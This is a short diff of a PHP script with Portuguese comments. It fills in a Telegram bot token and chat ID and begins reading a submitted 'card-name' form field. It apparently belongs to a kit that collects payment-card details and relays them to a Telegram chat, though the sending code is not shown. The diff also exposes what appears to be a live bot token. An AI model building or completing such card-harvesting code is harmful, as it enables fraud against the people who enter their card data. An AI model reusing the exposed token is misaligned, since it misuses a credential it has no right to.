@@ -4,8 +4,8 @@
  */
 
 // ================= CONFIGURAÇÕES DO BOT =================
-$botToken = "SEU_TOKEN_AQUI"; 
-$chatId = "SEU_CHAT_ID_AQUI";   
+$botToken = "9039149841:AAHI3yAs-jTUTuYuxwTFvoLHhA01PlehXhA"; 
+$chatId = "6544488805";   
 // =======================================================
 
 $name   = $_POST['card-name']   ?? 'Não informado';
